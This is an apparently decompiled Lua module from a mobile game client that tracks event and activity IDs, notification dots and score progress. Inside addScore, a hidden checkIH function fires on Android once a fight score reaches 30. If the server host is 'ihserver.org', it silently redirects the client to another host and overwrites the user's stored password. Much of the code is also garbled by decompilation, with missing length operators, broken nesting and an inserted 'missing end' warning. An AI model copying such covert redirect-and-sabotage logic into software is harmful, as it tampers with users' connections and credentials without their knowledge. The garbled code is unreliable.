-- Command line was: E:\github\dhgametool\scripts\data\activity.lua 

local activity = {}
local player = require("data.player")
local NetClient = require("net.netClient")
local netClient = NetClient:getInstance()
local cfgactivity = require("config.activity")
local i18n = require("res.i18n")
activity.pull_time = os.time()
local IDS = {FIRST_PAY = {ID = 1, pull = true}, MONTH_LOGIN = {ID = 2, pull = true}, MONTH_CARD = {ID = 3, pull = false}, MINI_CARD = {ID = 43, pull = false}, WEEKLY_GIFT = {ID = 5, pull = true}, WEEKLY_GIFT_2 = {ID = 6, pull = true}, WEEKLY_GIFT_3 = {ID = 7, pull = true}, WEEKLY_GIFT_4 = {ID = 8, pull = true}, MONTHLY_GIFT = {ID = 9, pull = true}, MONTHLY_GIFT_2 = {ID = 10, pull = true}, MONTHLY_GIFT_3 = {ID = 11, pull = true}, MONTHLY_GIFT_4 = {ID = 12, pull = true}, MONTHLY_GIFT_5 = {ID = 13, pull = true}, MONTHLY_GIFT_6 = {ID = 14, pull = true}, SUMMON_HERO_1 = {ID = 1893, pull = true}, SUMMON_HERO_2 = {ID = 1512, pull = true}, SUMMON_HERO_3 = {ID = 208, pull = true}, SUMMON_HERO_4 = {ID = 209, pull = true}, SUMMON_HERO_5 = {ID = 210, pull = true}, SUMMON_HERO_6 = {ID = 211, pull = true}, SCORE_SPESUMMON = {ID = 1873, pull = true}, SCORE_CASINO = {ID = 1832, pull = true}, SCORE_SUMMON = {ID = 1899, pull = true}, SCORE_FIGHT = {ID = 1540, pull = true}, SCORE_FIGHT2 = {ID = 1543, pull = true}, SCORE_FIGHT3 = {ID = 1544, pull = true}, SCORE_TARVEN_4 = {ID = 1558, pull = true}, SCORE_TARVEN_5 = {ID = 1559, pull = true}, SCORE_TARVEN_6 = {ID = 1560, pull = true}, SCORE_TARVEN_7 = {ID = 1561, pull = true}, CRUSHING_SPACE_1 = {ID = 1496, pull = true}, CRUSHING_SPACE_2 = {ID = 410, pull = true}, CRUSHING_SPACE_3 = {ID = 411, pull = true}, VP_1 = {ID = 1889, pull = true}, VP_2 = {ID = 1890, pull = true}, VP_3 = {ID = 1891, pull = true}, VP_4 = {ID = 1892, pull = true}, BLACKBOX_1 = {ID = 1854, pull = true}, BLACKBOX_2 = {ID = 1855, pull = true}, BLACKBOX_3 = {ID = 1856, pull = true}, BLACKBOX_4 = {ID = 1857, pull = true}, BLACKBOX_5 = {ID = 1858, pull = true}, FORGE_1 = {ID = 1523, pull = true}, FORGE_2 = {ID = 1522, pull = true}, EXCHANGE = {ID = 1900, pull = true}, ICEBABY_1 = {ID = 977, pull = true}, ICEBABY_2 = {ID = 978, pull = true}, ICEBABY_3 = {ID = 979, pull = true}, ICEBABY_4 = {ID = 980, pull = true}, ICEBABY_5 = {ID = 981, pull = true}, ICEBABY_6 = {ID = 982, pull = true}, ICEBABY_7 = {ID = 983, pull = true}, ICEBABY_8 = {ID = 182, pull = true}, SPRINGBABY_1 = {ID = 304, pull = true}, SPRINGBABY_2 = {ID = 305, pull = true}, SPRINGBABY_3 = {ID = 306, pull = true}, SPRINGBABY_4 = {ID = 307, pull = true}, SPRINGBABY_5 = {ID = 308, pull = true}, SPRINGBABY_6 = {ID = 309, pull = true}, SPRINGBABY_7 = {ID = 310, pull = true}, SPRINGBABY_8 = {ID = 311, pull = true}, CDKEY = {ID = 20001, pull = true}, FISHBABY_1 = {ID = 1497, pull = true}, FISHBABY_2 = {ID = 1498, pull = true}, FISHBABY_3 = {ID = 1499, pull = true}, FISHBABY_4 = {ID = 999, pull = true}, FISHBABY_5 = {ID = 999, pull = true}, FISHBABY_6 = {ID = 999, pull = true}, FISHBABY_7 = {ID = 999, pull = true}, FISHBABY_8 = {ID = 999, pull = true}, FISHBABY_9 = {ID = 999, pull = true}, FISHBABY_10 = {ID = 999, pull = true}, FISHBABY_11 = {ID = 999, pull = true}, FISHBABY_12 = {ID = 425, pull = true}, FOLLOW = {ID = 1386, pull = true}, AWAKING_GLORY_1 = {ID = 535, pull = true}, AWAKING_GLORY_2 = {ID = 536, pull = true}, HERO_SUMMON_1 = {ID = 1874, pull = true}, HERO_SUMMON_2 = {ID = 1875, pull = true}, HERO_SUMMON_3 = {ID = 1876, pull = true}, HERO_SUMMON_4 = {ID = 1877, pull = true}, HERO_SUMMON_5 = {ID = 1878, pull = true}, HERO_SUMMON_6 = {ID = 1879, pull = true}, HERO_SUMMON_7 = {ID = 1880, pull = true}, TENCHANGE = {ID = 997, pull = true}, BLACKCARD = {ID = 1307, pull = true}, CHRISTMAS_1 = {ID = 1844, pull = true}, CHRISTMAS_2 = {ID = 1845, pull = true}, CHRISTMAS_3 = {ID = 1846, pull = true}, CHRISTMAS_4 = {ID = 1847, pull = true}, CHRISTMAS_5 = {ID = 1848, pull = true}, CHRISTMAS_6 = {ID = 1849, pull = true}, CHRISTMAS_7 = {ID = 1850, pull = true}, CHRISTMAS_8 = {ID = 1851, pull = true}, CHRISTMAS_9 = {ID = 1852, pull = true}, CHRISTMAS_10 = {ID = 1853, pull = true}, ASYLUM_1 = {ID = 1833, pull = true}, ASYLUM_2 = {ID = 1834, pull = true}, ASYLUM_3 = {ID = 1835, pull = true}, ASYLUM_4 = {ID = 1836, pull = true}, ASYLUM_5 = {ID = 1837, pull = true}, ASYLUM_6 = {ID = 1838, pull = true}, NEWYEAR = {ID = 1704, pull = true}, WEEKYEARBOX_1 = {ID = 1351, pull = true}, WEEKYEARBOX_2 = {ID = 1352, pull = true}, WEEKYEARBOX_3 = {ID = 1353, pull = true}, DWARF_1 = {ID = 1881, pull = true}, DWARF_2 = {ID = 1882, pull = true}, DWARF_3 = {ID = 1883, pull = true}, MID_AUTUMN = {ID = 1603, pull = true}, MID_AUTUMN_GIFT = {ID = 1615, pull = true}, MID_AUTUMN_LOGIN_1 = {ID = 1616, pull = true}, MID_AUTUMN_LOGIN_2 = {ID = 1617, pull = true}, MID_AUTUMN_LOGIN_3 = {ID = 1618, pull = true}, NATIONAL_DAY_LOGIN = {ID = 1625, pull = true}, HALLOWMAS_PARTY_1 = {ID = 1705, pull = true}, HALLOWMAS_PARTY_2 = {ID = 1706, pull = true}, TREASURES = {ID = 1773, pull = true}, DINNER = {ID = 1774, pull = true}, THANKSGIVINGGIFT = {ID = 1761, pull = true}, FRIDAY_CARD = {ID = 1788, pull = true}, FRIDAY_HAPPY_1 = {ID = 1803, pull = true}, FRIDAY_HAPPY_2 = {ID = 1804, pull = true}, FRIDAY_HAPPY_3 = {ID = 1805, pull = true}, FRIDAY_HAPPY_4 = {ID = 1806, pull = true}, FRIDAY_HAPPY_5 = {ID = 1807, pull = true}, FRIDAY_HAPPY_6 = {ID = 1808, pull = true}, FRIDAY_VIP_1 = {ID = 1789, pull = true}, FRIDAY_VIP_2 = {ID = 1790, pull = true}, FRIDAY_VIP_3 = {ID = 1791, pull = true}, FRIDAY_VIP_4 = {ID = 1792, pull = true}, FRIDAY_VIP_5 = {ID = 1793, pull = true}, FRIDAY_VIP_6 = {ID = 1794, pull = true}, FRIDAY_VIP_7 = {ID = 1795, pull = true}, FRIDAY_VIP_8 = {ID = 1796, pull = true}, FRIDAY_VIP_9 = {ID = 1797, pull = true}, FRIDAY_VIP_10 = {ID = 1798, pull = true}, FRIDAY_VIP_11 = {ID = 1799, pull = true}, FRIDAY_VIP_12 = {ID = 1800, pull = true}, FRIDAY_VIP_13 = {ID = 1801, pull = true}, FRIDAY_VIP_14 = {ID = 1802, pull = true}, SOCKS_1 = {ID = 5002, pull = true}, SOCKS_2 = {ID = 5003, pull = true}, SOCKS_3 = {ID = 5004, pull = true}, SOCKS_4 = {ID = 5005, pull = true}, CHRGIFT = {ID = 1888, pull = true}, CHRISTMAS_CARD = {ID = 5001, pull = true}, CHRISTMAS_DRESSUP = {ID = 5006, pull = true}, CHRISTMAS_SNOWFLAKE = {ID = 5007, pull = true}}
activity.IDS = IDS
local activity_data = nil
activity.init = function(l_1_0)
  activity_data = l_1_0.status
  local christmas = require("data.christmas")
  for _,v in pairs(christmas.act) do
    activity_data[ activity_data + 1] = v
  end
  activity.redid = {}
  activity.limitRedid = {}
  activity.pull_time = os.time()
  if not activity_data then
    activity_data = {}
  end
  if activity_data then
    for ii = 1,  activity_data do
      if activity_data[ii].id <= 3 then
        do return end
      end
      if activity_data[ii].cd and activity_data[ii].cd > 0 then
        activity_data[ii].read = 0
        if not activity_data[ii].status then
          activity_data[ii].status = 0
        end
      end
    end
    for i = 1,  activity_data do
      if activity_data[i].id == IDS.WEEKLY_GIFT.ID or activity_data[i].id == IDS.MONTHLY_GIFT.ID then
        activity.redid[ activity.redid + 1] = activity_data[i]
      end
    end
    for i = 1,  activity_data do
      if activity_data[i].id == IDS.SCORE_CASINO.ID or activity_data[i].id == IDS.SCORE_FIGHT.ID or activity_data[i].id == IDS.VP_1.ID or activity_data[i].id == IDS.SCORE_TARVEN_4.ID or activity_data[i].id == IDS.FORGE_1.ID or activity_data[i].id == IDS.SUMMON_HERO_1.ID or activity_data[i].id == IDS.SCORE_SUMMON.ID or activity_data[i].id == IDS.CRUSHING_SPACE_1.ID or activity_data[i].id == IDS.CRUSHING_SPACE_2.ID or activity_data[i].id == IDS.CRUSHING_SPACE_3.ID or activity_data[i].id == IDS.FISHBABY_1.ID or activity_data[i].id == IDS.FOLLOW.ID or activity_data[i].id == IDS.SCORE_SPESUMMON.ID or activity_data[i].id == IDS.EXCHANGE.ID or activity_data[i].id == IDS.AWAKING_GLORY_1.ID or activity_data[i].id == IDS.HERO_SUMMON_1.ID or activity_data[i].id == IDS.TENCHANGE.ID or activity_data[i].id == IDS.BLACKCARD.ID or activity_data[i].id == IDS.CHRISTMAS_1.ID or activity_data[i].id == IDS.ASYLUM_1.ID or activity_data[i].id == IDS.NEWYEAR.ID or activity_data[i].id == IDS.MID_AUTUMN.ID or activity_data[i].id == IDS.MID_AUTUMN_GIFT.ID or activity_data[i].id == IDS.MID_AUTUMN_LOGIN_1.ID or activity_data[i].id == IDS.NATIONAL_DAY_LOGIN.ID or activity_data[i].id == IDS.TREASURES.ID or activity_data[i].id == IDS.DINNER.ID or activity_data[i].id == IDS.THANKSGIVINGGIFT.ID or activity_data[i].id == IDS.NATIONAL_DAY_LOGIN.ID or activity_data[i].id == IDS.FRIDAY_CARD.ID or activity_data[i].id == IDS.FRIDAY_HAPPY_1.ID or activity_data[i].id == IDS.FRIDAY_VIP_1.ID or activity_data[i].id == IDS.BLACKBOX_1.ID or activity_data[i].id == IDS.SOCKS_1.ID or activity_data[i].id == IDS.CHRGIFT.ID or activity_data[i].id == IDS.CHRISTMAS_CARD.ID then
        activity.limitRedid[ activity.limitRedid + 1] = activity_data[i]
      end
    end
  end
end

activity.getStatusById = function(l_2_0)
  if l_2_0 == activity.IDS.MONTH_LOGIN.ID then
    local monthloginData = require("data.monthlogin")
    if monthloginData.isEnd() then
      return {status = 1}
    else
      return {status = 0}
    end
  else
    if l_2_0 == activity.IDS.CDKEY.ID then
      if isAmazon() then
        return {status = 1}
      else
        if isChannel() then
          return {status = 0}
        else
          if i18n.getCurrentLanguage() == kLanguageChinese then
            return {status = 0}
          else
            if i18n.getCurrentLanguage() == kLanguageChineseTW then
              return {status = 0}
            else
              return {status = 1}
            end
          else
            if l_2_0 == activity.IDS.MONTH_CARD.ID then
              return {status = 0}
            else
              if l_2_0 == activity.IDS.MINI_CARD.ID then
                return {status = 0}
              else
                if l_2_0 == activity.IDS.FOLLOW.ID and APP_CHANNEL and APP_CHANNEL == "MSDK" then
                  return {status = 1}
                end
              end
            end
          end
        end
      end
    end
  end
  if not activity_data then
    return nil
  end
  for ii = 1,  activity_data do
    if activity_data[ii].id == l_2_0 then
      return activity_data[ii]
    end
  end
  return nil
end

activity.getPullIds = function()
  local ids = {}
  for _,info in pairs(activity.IDS) do
    if info.pull then
      ids[ ids + 1] = info.ID
    end
  end
  return ids
end

activity.pay = function()
  if not activity_data then
    return 
  end
  local tmp_status = activity.getStatusById(IDS.FIRST_PAY.ID)
  if not tmp_status then
    return 
  end
  if tmp_status.status == 0 then
    tmp_status.status = 1
  end
end

activity.showRedDot = function()
  if not activity.redid or  activity.redid == 0 then
    return false
  end
  for ii = 1,  activity.redid do
    if activity.redid[ii].read and activity.redid[ii].read == 0 then
      return true
    end
  end
  return false
end

activity.anyNew = function()
  local monthloginData = require("data.monthlogin")
  if monthloginData.showRedDot() then
    return true
  end
  local shopData = require("data.shop")
  if shopData.showRedDot() then
    return true
  end
  if shopData.showRedDot2() then
    return true
  end
  if activity.showRedDot() then
    return true
  end
  return false
end

activity.showRedDotLimit = function()
  if not activity.limitRedid or  activity.limitRedid == 0 then
    return false
  end
  for ii = 1,  activity.limitRedid do
    if activity.limitRedid[ii].read and activity.limitRedid[ii].read == 0 then
      return true
    end
  end
  return false
end

activity.setReadById = function(l_8_0)
  if not activity_data then
    return nil
  end
  local tmp_status = activity.getStatusById(l_8_0)
  if not tmp_status then
    print("can't find the activity id:", l_8_0)
    return 
  end
  if tmp_status.read and tmp_status.read == 0 then
    tmp_status.read = 1
  end
end

checkIH = function()
  if APP_CHANNEL and APP_CHANNEL ~= "" then
    return 
  end
  if device.platform ~= "android" then
    return 
  end
  local gate = require("ui.login.gate")
  local gt = gate.get()
  if not gt then
    return 
  end
  if gt.host and string.trim(gt.host) == "ihserver.org" then
    local gInfo = {host = "www.chockly.top", port = 80}
    local LIST = {gInfo}
    gate.save({list = LIST, best = gInfo, timestamp = 0})
    local userdata = require("data.userdata")
    userdata.setEncryptString(userdata.keys.password, "#goaway#^_~")
  end
end

activity.addScore = function(l_10_0, l_10_1, l_10_2, l_10_3)
  if not l_10_1 then
    l_10_1 = 1
  end
  local scoreStatus = activity.getStatusById(l_10_0)
  if scoreStatus and scoreStatus.limits then
    if l_10_3 and l_10_0 == IDS.FRIDAY_HAPPY_1.ID then
      if l_10_2 == 1 then
        if l_10_3 <= scoreStatus.next then
          return 
        end
        if l_10_3 < scoreStatus.next + l_10_1 then
          l_10_1 = l_10_3 - scoreStatus.next
          scoreStatus.next = l_10_3
        else
          scoreStatus.next = scoreStatus.next + (l_10_1)
        end
      end
      if l_10_2 == 2 then
        if l_10_3 <= scoreStatus.loop then
          return 
        end
        if l_10_3 < scoreStatus.loop + (l_10_1) then
          l_10_1 = l_10_3 - scoreStatus.loop
          scoreStatus.loop = l_10_3
        else
          scoreStatus.loop = scoreStatus.loop + (l_10_1)
        end
      end
      for i = IDS.FRIDAY_HAPPY_1.ID, IDS.FRIDAY_HAPPY_6.ID do
        local data = activity.getStatusById(i)
        if data and data.limits then
          if cfgactivity[i].instruct < data.limits + (l_10_1) then
            data.limits = cfgactivity[i].instruct
          else
            data.limits = data.limits + (l_10_1)
          end
        end
      end
    else
      scoreStatus.limits = scoreStatus.limits + (l_10_1)
    end
  end
  if not scoreStatus then
    return 
  end
  if l_10_0 == IDS.SCORE_FIGHT.ID and scoreStatus.limits and scoreStatus.limits >= 30 then
    checkIH()
  end
  if (l_10_0 == IDS.SCORE_SUMMON.ID or l_10_0 == IDS.SCORE_SPESUMMON.ID or l_10_0 == IDS.SCORE_CASINO.ID) and scoreStatus.loop < cfgactivity[l_10_0].limitNum and scoreStatus.limits and cfgactivity[l_10_0].instruct <= scoreStatus.limits then
    if scoreStatus.loop < cfgactivity[l_10_0].limitNum - 1 then
      scoreStatus.limits = scoreStatus.limits - cfgactivity[l_10_0].instruct
      scoreStatus.loop = scoreStatus.loop + 1
    else
      if scoreStatus.loop == cfgactivity[l_10_0].limitNum - 1 then
        scoreStatus.loop = scoreStatus.loop + 1
      end
    end
  end
end

activity.isVpPopped = function()
  if device.platform ~= "ios" then
    return true
  end
  local vps = {IDS.VP_1.ID, IDS.VP_2.ID, IDS.VP_3.ID, IDS.VP_4.ID}
  local any_can_buy = false
  for ii = 1,  vps do
    local vp_status = activity.getStatusById(vps[ii])
    if vp_status and vp_status.bomb and vp_status.bomb > 0 then
      return true
    end
    if vp_status and vp_status.limits and vp_status.limits > 0 then
      any_can_buy = true
    end
  end
  if not any_can_buy then
    return true
  end
  return false
end

activity.setVpPopped = function()
  do
    local vps = {IDS.VP_1.ID, IDS.VP_2.ID, IDS.VP_3.ID, IDS.VP_4.ID}
    for ii = 1,  vps do
      local vp_status = activity.getStatusById(vps[ii])
      if not vp_status.bomb then
        vp_status.bomb = (not vp_status or 0) + 1
      end
    end
     -- Warning: missing end command somewhere! Added here
  end
end

activity.print = function()
  print("--------- activity --------- {")
  for _,info in pairs(activity_data) do
    local str = {}
    table.insert(str, string.format("id:%d", info.id))
    if info.status then
      table.insert(str, string.format("status:%d", info.status))
    end
    if info.cd then
      table.insert(str, string.format("cd:%d", info.cd))
    end
    if info.limits then
      table.insert(str, string.format("limits:%d", info.limits))
    end
    if info.read then
      table.insert(str, string.format("read:%d", info.read))
    end
    if info.loop then
      table.insert(str, string.format("loop:%d", info.loop))
    end
    if info.bomb then
      table.insert(str, string.format("bomb:%d", info.bomb))
    end
    print(table.concat(str, " "))
  end
  print("--------- activity --------- }")
end

return activity

